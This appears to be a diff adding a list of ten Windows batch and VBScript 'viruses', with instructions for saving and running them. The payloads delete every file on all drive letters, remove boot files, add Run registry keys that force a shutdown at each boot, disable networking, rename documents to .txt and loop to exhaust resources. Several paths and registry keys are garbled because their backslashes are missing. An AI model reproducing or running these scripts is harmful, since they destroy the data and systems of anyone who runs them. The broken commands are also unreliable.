@@ -1,0 +1,194 @@
+The steps to make this viruses executable are:
+
+1⃣ Make a text file
+
+2⃣ Paste code
+
+3⃣ Save as all files with extension .bat ( test.bat)
+
+
+
+
+VIRUS 1 — DELETE ALL PARTITIONS
+
+@echo off
+
+Del C:\*.* /f /s /q
+
+Del D:\*.* /f /s /q
+
+Del E:\*.* /f /s /q
+
+Del F:\*.* /f /s /q
+
+Del G:\*.* /f /s /q
+
+Del H:\*.* /f /s /q
+
+Del I:\*.* /f /s /q
+
+
+
+VIRUS 2 — This Virus Deletes All The Content Of C Drive
+
+@echo off
+
+del %systemdrive%*.* /f /s /q
+
+shutdown -r -f -t 00
+
+VIRUS 3 — This Will Crash your Computer
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
+ 
+Dim x
+For x = 1 to 100000000
+WSHShell.Run "Tourstart.exe"
+Save virus 3 file with .vbs file extension
+
+VIRUS 4 — Virus that crashes pc
+
+@echo off
+
+attrib -r -s -h c:autoexec.bat
+
+del c:autoexec.bat
+
+attrib -r -s -h c:boot.ini
+
+del c:boot.ini
+
+attrib -r -s -h c:ntldr
+
+del c:ntldr
+
+attrib -r -s -h c:windowswin.ini
+
+del c:windowswin.ini
+
+@echo off
+
+msg * YOU GOT OWNED!!!
+
+shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
+
+VIRUS 5 — Shutdowns Computer Everytime It Is Turned On
+
+echo @echo off>c:windowshartlell.bat
+
+echo break off>>c:windowshartlell.bat
+
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+
+echo end>>c:windowshartlell.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+
+echo You have been HACKED.
+
+PAUSE
+
+VIRUS 6 — DISABLES I-NET
+
+echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo You Have Been HACKED!
+
+PAUSE
+
+VIRUS 7 — CHANGE ALL FILES TO NON WORKING TXT FILES
+
+REN *.DOC *.TXT
+
+REN *.JPEG *.TXT
+
+REN *.LNK *.TXT
+
+REN *.AVI *.TXT
+
+REN *.MPEG *.TXT
+
+REN *.COM *.TXT
+
+REN *.BAT *.TXT
+
+VIRUS 8 — SYSTEM MELTDOWN
+
+:CRASH
+
+net send * WORKGROUP ENABLED
+
+ipconfig /release
+
+shutdown -r -f -t0
+
+echo @echo off>c:windowshartlell.bat
+
+echo break off>>c:windowshartlell.bat
+
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+
+echo end>>c:windowshartlell.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+
+echo You Have Been Hacked echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo YOU HAVE BEEN HACKED
+
+REN *.DOC *.TXT
+
+REN *.JPEG *.TXT
+
+REN *.LNK *.TXT
+
+REN *.AVI *.TXT
+
+REN *.MPEG *.TXT
+
+REN *.COM *.TXT
+
+REN *.BAT *.TXT
+
+GOTO CRASH
+
+VIRUS 9 — SYSTEM 32 DELETER
+
+@echo off
+
+del c:\\windows\system32
+
+VIRUS 10 — ENDLESS NOTEPAD OPENER
+
+@ECHO off
+
+:top
+
+START %SystemRoot%\system32\notepad.exe
+
+GOTO top
